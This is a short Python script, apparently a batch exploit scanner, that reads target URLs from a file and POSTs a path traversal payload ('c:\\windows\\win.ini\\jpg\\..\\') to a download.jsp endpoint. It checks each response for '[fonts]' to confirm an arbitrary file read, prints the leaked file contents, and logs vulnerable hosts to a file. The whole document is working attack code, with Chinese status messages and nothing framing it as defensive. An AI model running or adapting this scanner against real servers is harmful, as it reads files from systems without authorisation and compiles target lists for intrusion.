import requests

headers = {
	"Content-Type": "application/x-www-form-urlencoded"
}

data = {
	"jpgfilepath": "c:\\windows\\win.ini\\jpg\\..\\",
	"outfiletype": "xls"
}


for url in open("download.jsp任意文件读取.txt"):
	try:
		url = url.replace("\n", "")
		print(url+"检测中----\n\n")
		jiaoyan = requests.post(url, data=data, headers=headers, timeout=5)
		if ("[fonts]" in jiaoyan.text) and (jiaoyan.status_code == 200):
			print(jiaoyan.text)
			with open("download.jsp vul.txt", "a+") as f:
				f.write(url + "\n")
		else:
			print(url+"不存在漏洞\n")
	except:
		continue
